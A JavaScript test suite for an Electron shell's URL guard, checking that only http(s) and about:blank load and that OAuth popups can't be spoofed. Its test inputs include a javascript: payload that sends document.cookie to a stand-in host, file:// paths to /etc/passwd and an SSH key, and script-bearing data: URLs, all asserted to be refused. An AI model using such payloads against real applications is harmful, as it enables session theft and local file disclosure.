// The native shell's URL gate (electron/url-guard.js).
//
// The finding this pins: `cfhub:web:navigate` handed the renderer's string straight to
// webContents.loadURL() with no check — the ONE URL path in main.js without a scheme test,
// while the two beside it already had one. And the OAuth-popup gate ran its path regex
// over the raw string, so anything merely CONTAINING "/sso/" earned a real child window.
//
// electron/ is a CommonJS package and main.js cannot be imported here (it requires
// 'electron'), so the decision was extracted into a dependency-free module that both
// main.js and this file load.
import test from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const { isLoadableUrl, isOAuthPopupUrl } = require('../electron/url-guard.js');

// The real regexes from electron/main.js — transcribed so this test judges the actual policy.
const AUTH_HOST = /(^|\.)accounts\.google\.com$|(^|\.)appleid\.apple\.com$|(^|\.)login\.microsoftonline\.com$|(^|\.)login\.live\.com$/i;
const OAUTH_POPUP_RE = /\/oauth|\/__\/auth\/|\/signin-|\/sso\//i;
const isOAuthPopup = (u) => isOAuthPopupUrl(u, AUTH_HOST, OAUTH_POPUP_RE);

test('the browser still opens ordinary web pages', () => {
  for (const u of ['https://example.com/', 'http://127.0.0.1:5173/', 'https://sub.domain.co.uk/a?b=c#d']) {
    assert.equal(isLoadableUrl(u), true, u);
  }
  assert.equal(isLoadableUrl('about:blank'), true, 'the shell parks empty views on about:blank');
});

test('local files are NOT web pages — the reason this guard exists', () => {
  for (const u of [
    'file:///etc/passwd',
    'file:///Users/someone/.ssh/id_ed25519',
    'FILE:///etc/hosts',                       // scheme matching must not be case-sensitive
    '  file:///etc/passwd  ',                  // nor defeated by whitespace
  ]) {
    assert.equal(isLoadableUrl(u), false, u);
  }
});

test('script- and content-bearing pseudo-schemes are refused', () => {
  for (const u of [
    'javascript:fetch("http://x/"+document.cookie)',
    'data:text/html,<script>alert(1)</script>',
    'blob:https://example.com/1234',
    'chrome://settings',
    'devtools://devtools/bundled/inspector.html',
    'about:cache',                              // only about:blank is allowed, not about:*
    'ftp://files.example.com/',
    'cfhub://whatever',
  ]) {
    assert.equal(isLoadableUrl(u), false, u);
  }
});

test('junk input is refused rather than thrown on', () => {
  for (const u of ['', '   ', 'not a url', '//example.com', null, undefined, 42, {}]) {
    assert.equal(isLoadableUrl(u), false, String(u));
  }
});

test('OAuth popups: a provider host over https still gets its real child window', () => {
  assert.equal(isOAuthPopup('https://accounts.google.com/o/oauth2/v2/auth?client_id=x'), true);
  assert.equal(isOAuthPopup('https://login.microsoftonline.com/common/oauth2/authorize'), true);
  assert.equal(isOAuthPopup('https://some.app.example/sso/start'), true, 'a real OAuth path on any https host');
});

test('OAuth popups: the path regex can no longer be satisfied by a non-https string', () => {
  // This is the regression. Each of these contains a substring the old raw-string test
  // matched, and each would have been granted a real BrowserWindow.
  assert.equal(isOAuthPopup('javascript:alert(1)//sso/'), false);
  assert.equal(isOAuthPopup('data:text/html,<b>/oauth</b>'), false);
  assert.equal(isOAuthPopup('file:///tmp/sso/index.html'), false);
  assert.equal(isOAuthPopup('http://plain.example/sso/'), false, 'OAuth over http is not OAuth');
});

test('OAuth popups: only the PATH counts — a query or fragment cannot fake one', () => {
  assert.equal(isOAuthPopup('https://evil.example/landing?next=/sso/login'), false);
  assert.equal(isOAuthPopup('https://evil.example/landing#/oauth'), false);
  assert.equal(isOAuthPopup('https://evil.example/'), false);
});

test('a host that merely ENDS in a provider name is not that provider', () => {
  assert.equal(isOAuthPopup('https://accounts.google.com.evil.example/x'), false);
  assert.equal(isOAuthPopup('https://notaccounts.google.com/x'), false, 'the boundary is a dot, not a substring');
});
